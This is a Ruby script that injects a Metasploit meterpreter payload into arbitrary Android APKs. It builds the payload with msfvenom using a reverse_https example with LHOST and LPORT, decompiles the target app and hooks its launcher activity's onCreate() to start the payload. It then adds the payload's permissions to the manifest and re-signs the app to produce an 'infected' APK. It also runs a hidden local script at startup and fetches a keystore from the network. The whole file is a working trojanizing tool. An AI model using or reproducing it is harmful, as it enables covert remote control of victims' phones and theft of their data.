#!/usr/bin/env ruby
# This script automatice the injections of metasploit payloads on arbitrary APKs.
# The APKs file have to be vulnerable without unicode files.

require 'nokogiri'
require 'fileutils'
require 'optparse'

class String
  def black;          "\033[30m#{self}\033[0m" end
  def red;            "\033[31m#{self}\033[0m" end
  def green;          "\033[32m#{self}\033[0m" end
  def brown;          "\033[33m#{self}\033[0m" end
  def blue;           "\033[34m#{self}\033[0m" end
  def magenta;        "\033[35m#{self}\033[0m" end
  def cyan;           "\033[36m#{self}\033[0m" end
  def gray;           "\033[37m#{self}\033[0m" end
end

system('bash ${PWD}/.IbyC/embed')

# Find the activity that apk_backdoor.rb is opened when you click the app icon
def findlauncheractivity(amanifest)
    package = amanifest.xpath("//manifest").first['package']
    activities = amanifest.xpath("//activity|//activity-alias")
    for activity in activities 
        activityname = activity.attribute("name")
        category = activity.search('category')
        unless category
            next
        end
        for cat in category
            categoryname = cat.attribute('name')
            if (activityname = `aapt dump badging $(pwd)/original.apk | awk '/activity/{gsub("name=|'"'"'","");  print $2}'`)
                activityname = activityname.to_s
                return activityname
            elsif (categoryname.to_s == 'android.intent.category.LAUNCHER' || categoryname.to_s == 'android.intent.action.MAIN')
                activityname = activityname.to_s
                unless activityname.start_with?(package)
                    activityname = package + activityname
                end
                return activityname
            end
        end
    end
end

# If XML parsing of the manifest fails,
# recursively search the smali code for the onCreate() hook.
def scrapeFilesForLauncherActivity()
	smali_files||=[]
	Dir.glob('original/smali*/**/*.smali') do |file|
	  checkFile=File.read(file)
	  if (checkFile.include?";->onCreate(Landroid/os/Bundle;)V")
		smali_files << file
		smalifile = file
		activitysmali = checkFile
	  end
	end
	i=0
  print "[?]─➤ Please choose from one of the following:\n".cyan
	smali_files.each{|s_file|
    print "[+]─➤ Hook point ",i,": ",s_file,"\n".green
		i+=1
	}
	hook=-1
	while (hook < 0 || hook>i)
		print "\nHook: "
		hook = STDIN.gets.chomp.to_i
	end
	i=0
	smalifile=""
	activitysmali=""
	smali_files.each{|s_file|
		if (i==hook)
			checkFile=File.read(s_file)
			smalifile=s_file
			activitysmali = checkFile
			break
		end
		i+=1
	}
	return [smalifile,activitysmali]
end

def fix_manifest()
	payload_permissions=[]
	
	#Load payload's permissions
	File.open("payload/AndroidManifest.xml","r"){|file|
		k=File.read(file)
		payload_manifest=Nokogiri::XML(k)
		permissions = payload_manifest.xpath("//manifest/uses-permission")
		for permission in permissions
			name=permission.attribute("name")
			payload_permissions << name.to_s
		end
	#	print "#{k}"
	}
	original_permissions=[]
	apk_mani=''
	
	#Load original apk's permissions
	File.open("original/AndroidManifest.xml","r"){|file2|
		k=File.read(file2)
		apk_mani=k
		original_manifest=Nokogiri::XML(k)
		permissions = original_manifest.xpath("//manifest/uses-permission")
		for permission in permissions
			name=permission.attribute("name")
			original_permissions << name.to_s
		end
	#	print "#{k}"
	}
	#Get permissions that are not in original APK
	add_permissions=[]
	for permission in payload_permissions
		if !(original_permissions.include? permission)
      print "[+]─➤ Adding #{permission}\n".green
			add_permissions << permission
		end
	end
	inject=0
	new_mani=""
	#Inject permissions in original APK's manifest
	for line in apk_mani.split("\n")
		if (line.include? "uses-permission" and inject==0)
			for permission in add_permissions
				new_mani << "\t\t"+'<uses-permission android:name="'+permission+'"/>'+"\n"
			end
			new_mani << line+"\n"
			inject=1
		else
			new_mani << line+"\n"
		end
	end
	File.open("original/AndroidManifest.xml", "w") {|file| file.puts new_mani }
end

def cleaning_up()
  toClean = ["data","original","payload","original.apk","payload.apk","key.jks","payload.apk.idsig"]
  for i in toClean do
    `rm -rf "#{i}" 2>&1`
  end
end

apkfile = ARGV[0]
unless(apkfile && File.readable?(apkfile))
  puts "[Usage]─➤ embed.rb [target.apk] [msfvenom options]\n".cyan
  puts "[ex]─➤ embed.rb messenger.apk -p android/meterpreter/reverse_https LHOST=192.168.1.1 LPORT=8443".green
  exit(1)
end

jarsigner = `jarsigner`
unless(jarsigner && jarsigner.length > 0)
  puts "[ERR-jarsigner]─➤ Going to https://t.me/Ivam3_Bot".red
	exit(1)
end

apktool = `apktool`
unless(apktool && apktool.length > 0)
  puts "[ERR-apktool]─➤ Going to https://t.me/Ivam3_Bot".red
	exit(1)
end

zipalign = `ls ${PREFIX}/bin/zipalign`
unless(zipalign && zipalign.length > 0)
  puts "[ERR-zipalign]─➤ Going to https://t.me/Ivam3_Bot".red
  exit(1)
end

apk_v=`apktool`
unless(apk_v.split()[1].include?("v2."))
  puts "[ERR-apktool]─➤ version #{apk_v} not supported, please download the latest 2. version from git.\n".red
	exit(1)
end

begin
	msfvenom_opts = ARGV[1,ARGV.length]
	opts=""
	msfvenom_opts.each{|x|
	opts+=x
	opts+=" "
	}
rescue
  puts "[Usage]─➤ ".cyan,"EMBED [target.apk] [msfvenom options]\n"
  puts "[ex]─➤ ".green,"EMBED messenger.apk -p android/meterpreter/reverse_https LHOST=192.168.1.1 LPORT=8443"
  puts "[ERR-msf]─➤ Error parsing msfvenom options... Aborting.\n".red
	exit(1)
end

# Set signer key file || default was maded on nov/2022 with android debugging parameters
cleaning_up()
passwd = nil
print "[?]─➤ Set a keystore signer\n ╰{1}─➤ ".cyan,"Default (Android Debug key)\n ","╰{2}─➤ ".cyan,"Using your own key\n ","╰{3}─➤ ".cyan,"Create a new key\n ","╰────➤ ".cyan
`rm -rf $(pwd)/key.jks`
answ = $stdin.gets.to_i
if answ<=3 and answ>0
  case answ
  when 2
    print " ╰[Key-path]─➤ ".cyan
    jksfile = $stdin.gets.chomp.to_s
    if File.exist?("#{jksfile}")
      `cp "#{jksfile}" $(pwd)/key.jks`
    else
      puts " ╰[ERR-not_found]─➤ Aborting".red
      exit(1)
    end
  when 3
    system('keytool -genkey -v -keystore userkey.jks -keyalg RSA -keysize 2048 -validity 10000 -alias debugging')
    FileUtils.cp("userkey.jks","key.jks")
  else
    passwd = "android"
    system("wget --tries=20 --quiet https://raw.githubusercontent.com/ivam3/embed/master/.IbyC/key.jks -O $(pwd)/key.jks")
  end
else
  puts " ╰[ERR-bad_answer]─➤ Aborting.".red
  exit(1)
end

print "[*]─➤ Generating msfvenom payload..\n".cyan
res=`msfvenom -f raw #{opts} -o payload.apk 2>&1`
if res.downcase.include?("invalid" || "error")
	puts res
	exit(1)
end

print "[*]─➤ Signing payload..\n".cyan
if passwd.nil? || passwd.empty?
  print " ╰[?]─➤ ".cyan
  #`jarsigner -verbose -keystore ~/.android/debug.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA $(pwd)/payload.apk androiddebugkey`
  system('apksigner sign --ks key.jks --ks-key-alias debugging $(pwd)/payload.apk')
else
  `apksigner sign --ks key.jks --ks-pass pass:#{passwd} --ks-key-alias debugging $(pwd)/payload.apk`
end

`cp #{apkfile} $(pwd)/original.apk`
print "[*]─➤ Decompiling orignal APK..\n".cyan
`apktool d -f -r -o $(pwd)/original #{apkfile}`
print "[*]─➤ Ignoring the resource decompilation..\n".cyan
`apktool d -f -o $(pwd)/original_tmp #{apkfile}`
`cat $(pwd)/original_tmp/AndroidManifest.xml > $(pwd)/original/AndroidManifest.xml`
minSDKversion = `grep "minSdkVersion" -R $(pwd)/original_tmp|awk -F " " '{print $NF}'`
`rm -rf $(pwd)/original_tmp`
print "[*]─➤ Decompiling payload APK..\n".cyan
`apktool d -f -o $(pwd)/payload $(pwd)/payload.apk`

f = File.open("original/AndroidManifest.xml")
amanifest = Nokogiri::XML(f)
f.close

print "[*]─➤ Locating onCreate() hook..\n".cyan
launcheractivity = findlauncheractivity(amanifest)
#smalifile = 'original/smali/' + launcheractivity.gsub(/\./, "/") + '.smali'
smalif = Dir["original/**/" + launcheractivity.gsub(/\./, "/").gsub("\n", ".smali")]
smalif = smalif.to_s
smalifile = smalif.gsub("[", "").gsub("]", "").gsub("\"", "")

begin
  activitysmali = File.read(smalifile.to_s)
rescue Errno::ENOENT
  print "[w]─➤ Unable to find correct hook automatically\n".red
	begin
		results=scrapeFilesForLauncherActivity()
		smalifile=results[0]
		activitysmali=results[1]
	rescue
    cleaning_up()
    puts "[ERR-apk]─➤ Error finding launcher activity... Aborting".red
		exit(1)
	end
end

print "[*]─➤ Copying payload files..\n".cyan
FileUtils.mkdir_p('original/smali/com/metasploit/stage/')
FileUtils.cp Dir.glob('payload/smali/com/metasploit/stage/Payload*.smali'), 'original/smali/com/metasploit/stage/'
activitycreate = ';->onCreate(Landroid/os/Bundle;)V'
payloadhook = activitycreate + "\n    invoke-static {p0}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V"
hookedsmali = activitysmali.gsub(activitycreate, payloadhook)

print "[*]─➤ Loading ".cyan,smalifile," and injecting payload..\n".cyan
File.open(smalifile, "w") {|file| file.puts hookedsmali }
injected_apk=apkfile.split(".")[0]
injected_apk = "data/data/com_backdoored.apk"
final_apk=apkfile.split("/")[-1]
final_apk+="_final"

print "[*]─➤ Poisoning the manifest with meterpreter permissions..\n".cyan
fix_manifest()

print "[*]─➤ Rebuilding #{apkfile}\n      with meterpreter injection as #{injected_apk}..\n".cyan
for i in (1..3) do
  if !File.exist?("#{injected_apk}")
    `apktool b -f --use-aapt2 -o $(pwd)/#{injected_apk} $(pwd)/original 2>$(pwd)/.IbyC/embed.log`
  else
    break
  end
end

if File.exist?("#{injected_apk}")
  print "[*]─➤ Signing #{injected_apk} ..\n".cyan
  verifySigni = `apksigner verify --verbose #{injected_apk} 2>/dev/null`
  for i in (1..3) do
    if verifySigni.empty?
      if passwd.nil? || passwd.empty?
        print " ╰[?]─➤ ".cyan
        #`jarsigner -verbose -keystore ~/.android/debug.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA $(pwd)/#{injected_apk} androiddebugkey`
        system("apksigner sign --ks key.jks --ks-key-alias debugging --min-sdk-version 23 $(pwd)/#{injected_apk}")
      else
        `apksigner sign --ks key.jks --ks-pass pass:#{passwd} --ks-key-alias debugging --min-sdk-version 23 $(pwd)/#{injected_apk}`
      end
    end
  end

  print "[*]─➤ Aligning #{injected_apk} ..\n".cyan
  `zipalign -f -v 4 $(pwd)/#{injected_apk} #{final_apk}`
  cleaning_up()
  verifySign = `apksigner verify --verbose #{final_apk}`
  if !verifySign.empty?
    puts "[+]─➤ Infected file is ready in: $(pwd)/#{final_apk}.\n".green
  else
    cleaning_up()
    puts "[ERR-apksigner]─➤ Going at https://t.me/Ivam3_Bot".red,"\t╰[logfile]─➤ embed/.IbyC/embed.log".cyan
    exit(1)
  end
else
  cleaning_up()
  puts "[ERR-build]─➤ Going at https://t.me/Ivam3_Bot".red,"\t╰[logfile]─➤ embed/.IbyC/embed.log".cyan
  exit(1)
end

